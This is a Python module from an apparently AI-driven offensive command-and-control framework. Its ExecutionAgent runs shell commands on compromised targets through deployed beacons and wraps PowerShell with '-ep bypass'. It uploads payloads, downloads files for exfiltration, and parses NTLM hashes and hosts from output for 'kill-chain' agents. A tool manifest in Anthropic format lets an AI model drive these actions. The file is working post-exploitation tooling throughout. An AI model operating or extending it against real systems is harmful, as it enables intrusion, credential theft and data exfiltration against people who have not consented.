"""
ExecutionAgent -- Direct command execution on targets via live beacons.

Sends shell commands, PowerShell scripts, and file transfer operations to
beacons.  Returns the raw output and extracts any structured findings that
downstream kill-chain agents can consume.
"""

from __future__ import annotations

import logging
import re
import uuid

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class ExecutionAgent(AbstractAgent):
    name = "execution"
    description = (
        "Executes commands and manages files on target systems through "
        "deployed beacons"
    )
    capabilities = ["run_command", "upload_file", "download_file", "powershell"]

    # ------------------------------------------------------------------
    # Default timeout (seconds) waiting for beacon response.
    # ------------------------------------------------------------------
    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Execution agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Execution failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except KeyError as exc:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Missing required parameter: {exc}"},
                summary=f"Execution {action} failed: missing parameter {exc}",
            )
        except Exception as exc:
            logger.exception(
                "Execution %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Execution {action} failed: {exc}",
            )

    # ==================================================================
    #  run_command
    # ==================================================================

    async def _handle_run_command(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        command = params["command"]

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": command}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)
        stderr = self._extract_stderr(result)
        exit_code = self._extract_exit_code(result)

        if self._is_error(result):
            error_msg = result.get("error", stderr or "Command failed")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={
                    "stdout": stdout,
                    "stderr": stderr,
                    "exit_code": exit_code,
                    "error": error_msg,
                    "findings": self._extract_findings(stdout),
                },
                summary=f"Command on beacon {beacon_id} failed: {error_msg}",
            )

        status = "success" if exit_code == 0 else "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": exit_code,
                "findings": self._extract_findings(stdout),
            },
            summary=(
                f"Command '{self._truncate(command, 80)}' executed on beacon "
                f"{beacon_id} (exit {exit_code})"
            ),
        )

    # ==================================================================
    #  powershell  -- convenience wrapper
    # ==================================================================

    async def _handle_powershell(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        script = params["command"]
        # Wrap in powershell.exe invocation
        wrapped = f'powershell -ep bypass -c "{script}"'

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": wrapped}, timeout=timeout,
        )

        stdout = self._extract_stdout(result)
        stderr = self._extract_stderr(result)
        exit_code = self._extract_exit_code(result)

        if self._is_error(result):
            error_msg = result.get("error", stderr or "PowerShell execution failed")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={
                    "stdout": stdout,
                    "stderr": stderr,
                    "exit_code": exit_code,
                    "error": error_msg,
                    "findings": self._extract_findings(stdout),
                },
                summary=f"PowerShell on beacon {beacon_id} failed: {error_msg}",
            )

        status = "success" if exit_code == 0 else "partial"

        return TaskResult(
            task_id=task.id,
            status=status,
            data={
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": exit_code,
                "findings": self._extract_findings(stdout),
            },
            summary=(
                f"PowerShell '{self._truncate(script, 80)}' executed on beacon "
                f"{beacon_id} (exit {exit_code})"
            ),
        )

    # ==================================================================
    #  upload_file
    # ==================================================================

    async def _handle_upload_file(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        path = params["path"]
        content = params["content"]

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "upload_file",
            {"path": path, "content": content}, timeout=timeout,
        )

        if self._is_error(result):
            error_msg = result.get("error", "Upload failed")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": error_msg, "path": path},
                summary=f"Upload to {path} on beacon {beacon_id} failed: {error_msg}",
            )

        data = result.get("data", result)
        size = data.get("size_bytes", len(content)) if isinstance(data, dict) else len(content)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "path": path,
                "size_bytes": size,
                "findings": {},
            },
            summary=f"Uploaded {size} bytes to {path} on beacon {beacon_id}",
        )

    # ==================================================================
    #  download_file
    # ==================================================================

    async def _handle_download_file(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        path = params["path"]

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "download_file",
            {"path": path}, timeout=timeout,
        )

        if self._is_error(result):
            error_msg = result.get("error", "Download failed")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": error_msg, "path": path},
                summary=f"Download of {path} from beacon {beacon_id} failed: {error_msg}",
            )

        data = result.get("data", result)
        content = ""
        size = 0
        if isinstance(data, dict):
            content = data.get("content", "")
            size = data.get("size_bytes", len(content))
        elif isinstance(data, str):
            content = data
            size = len(data)

        return TaskResult(
            task_id=task.id,
            status="success",
            data={
                "path": path,
                "content": content,
                "size_bytes": size,
                "findings": self._extract_findings(content),
            },
            summary=f"Downloaded {path} ({size} bytes) from beacon {beacon_id}",
            artifacts=[{"type": "file", "path": path, "size": size}],
        )

    # ==================================================================
    #  Helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _extract_stderr(result: dict) -> str:
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stderr", "")
        return ""

    @staticmethod
    def _extract_exit_code(result: dict) -> int:
        if not result:
            return -1
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("exit_code", data.get("exitcode", 0))
        return 0

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    @staticmethod
    def _truncate(text: str, length: int) -> str:
        if len(text) <= length:
            return text
        return text[: length - 3] + "..."

    @staticmethod
    def _extract_findings(output: str) -> dict:
        """
        Best-effort extraction of interesting data from raw command output.
        Returns a findings dict with whatever categories we can detect:
          - credentials: password hashes, cleartext creds spotted in output
          - hosts: IP addresses or hostnames discovered
          - users: usernames spotted in output
        """
        if not output:
            return {}

        findings: dict[str, list[dict]] = {}

        # --- Detect IP addresses ---
        ips = set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", output))
        # Filter out obvious non-routable / meta addresses
        ignore = {"0.0.0.0", "255.255.255.255", "127.0.0.1"}
        ips -= ignore
        if ips:
            findings["hosts"] = [
                {"key": ip, "ip": ip, "source": "command_output"}
                for ip in sorted(ips)
            ]

        # --- Detect NTLM hashes (user:RID:LM:NT:::) ---
        hash_pattern = re.compile(
            r"^([^\s:]+):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
            re.MULTILINE,
        )
        hashes = hash_pattern.findall(output)
        if hashes:
            findings["credentials"] = [
                {"key": user, "username": user, "nt_hash": nt, "source": "command_output"}
                for user, nt in hashes
            ]

        return findings

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "execution_run_command",
                    "description": (
                        "Execute a shell command on the target system through "
                        "a beacon. Returns stdout, stderr, and exit code. "
                        "Supports any command the beacon process has permission "
                        "to run (cmd.exe context)."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "command": {
                                "type": "string",
                                "description": "The shell command to execute on the target",
                            },
                        },
                        "required": ["beacon_id", "command"],
                    },
                },
                {
                    "name": "execution_powershell",
                    "description": (
                        "Execute a PowerShell script on the target system. "
                        "The command is automatically wrapped in "
                        "'powershell -ep bypass -c \"...\"'. Use for AD "
                        "cmdlets, .NET calls, or any PowerShell one-liner."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "command": {
                                "type": "string",
                                "description": (
                                    "PowerShell script or one-liner to execute. "
                                    "Do NOT include the 'powershell' prefix."
                                ),
                            },
                        },
                        "required": ["beacon_id", "command"],
                    },
                },
                {
                    "name": "execution_upload_file",
                    "description": (
                        "Upload a file to the target system through a beacon. "
                        "Writes the provided content to the specified path. "
                        "Use for deploying tools, scripts, or payloads."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "path": {
                                "type": "string",
                                "description": (
                                    "Absolute file path on the target where the "
                                    "file should be written"
                                ),
                            },
                            "content": {
                                "type": "string",
                                "description": "The content to write to the file",
                            },
                        },
                        "required": ["beacon_id", "path", "content"],
                    },
                },
                {
                    "name": "execution_download_file",
                    "description": (
                        "Download a file from the target system through a "
                        "beacon. Retrieves the content and metadata of a file "
                        "at the specified path. Useful for exfiltrating "
                        "configuration files, logs, or captured data."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "path": {
                                "type": "string",
                                "description": (
                                    "Absolute file path on the target to download"
                                ),
                            },
                        },
                        "required": ["beacon_id", "path"],
                    },
                },
            ],
        }
